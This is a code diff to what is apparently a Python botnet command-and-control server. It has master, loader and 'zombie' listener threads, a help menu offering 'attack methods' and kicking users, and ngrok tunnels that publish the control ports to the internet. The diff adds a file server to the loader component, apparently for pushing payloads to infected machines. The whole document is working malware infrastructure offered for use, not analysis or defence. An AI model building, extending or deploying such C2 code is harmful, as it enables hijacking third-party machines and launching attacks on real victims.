@@ -118,7 +118,7 @@ class Master(threading.Thread):
             command = argument[0]
 
             # TODO: Show only avaiable commands and clean shit code
-            if command == 'help': # ・>
+            if command == 'help': # ・> | Rip eyes
                 table = self.console.raw_fade(self.console.get_custom_table(['📌 COMMAND', '📋 DESCRIPTION', '⭐ PERMISSION'], [
                     'clear\nmethod\nlist\ncreate_acc\ndelete_acc\nkill\nstats\nexit',
                     'Clean the screen\nSee attack methods\nSee connected users\nCreate an account\nDelete an account\nKick user from server\nShow cool stuff\nClose session',
@@ -244,10 +244,11 @@ class Master(threading.Thread):
             self.prompt()
 
 class Loader(threading.Thread):
-    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
+    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int, http_port: int):
         threading.Thread.__init__(self)
 
         self.network = network.Network(socket_session, database)
+        self.http_port = http_port
         self.database = database
         self.console = console
         self.port = port
@@ -291,6 +292,7 @@ class Loader(threading.Thread):
             self.send('ping')
 
     def run(self):
+        network.FileServer(self.http_port).start()
         threading.Thread(target= self.loop_thread).start()
         self.database.online_loader.append(self)
 
@@ -395,6 +397,7 @@ class Handler(threading.Thread):
 
     def master_thread(self, port: int, url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', port))
 
         self.console.print_success(f'Master -> online -> port: {port} -> url {url}')
@@ -404,19 +407,22 @@ class Handler(threading.Thread):
             (socket_session, (ip, port)) = sock.accept()
             Master(self.console, self.color, self.database, socket_session, ip, port).start()
     
-    def loader_thread(self, port: int, url: str):
+    def loader_thread(self, port: int, url: str, http_port: int, http_url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', port))
 
         self.console.print_success(f'Loader -> online -> port: {port} -> url {url}')
+        self.console.print_success(f'File Server -> online -> port: {http_port} -> url {http_url}')
 
         while True:
             sock.listen(1000)
             (socket_session, (ip, port)) = sock.accept()
-            Loader(self.console, self.database, socket_session, ip, port).start()
+            Loader(self.console, self.database, socket_session, ip, port, http_port).start()
 
     def zombie_thread(self, port: int, url: str):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', port))
 
         self.console.print_success(f'Zombie -> online -> port: {port} -> url {url}')
@@ -430,14 +436,16 @@ class Handler(threading.Thread):
         # Rip shit code btw 
         mp = random.randint(1500, 30000)
         lp = random.randint(30001, 55000)
-        zp = random.randint(55001, 65000)
+        zp = random.randint(55001, 60000)
+        hp = random.randint(60001, 65000)
 
         ml = (ngrok.connect(mp, 'tcp').public_url).split('://')[1]
         ll = (ngrok.connect(lp, 'tcp').public_url).split('://')[1]
         zl = (ngrok.connect(zp, 'tcp').public_url).split('://')[1]
+        hl = (ngrok.connect(hp, 'tcp').public_url).split('://')[1]
 
         threading.Thread(target= self.master_thread, args= (mp, ml,)).start()
-        threading.Thread(target= self.loader_thread, args= (lp, ll,)).start()
+        threading.Thread(target= self.loader_thread, args= (lp, ll, hp, hl)).start()
         threading.Thread(target= self.zombie_thread, args= (zp, zl,)).start()
 
 if __name__ == '__main__':
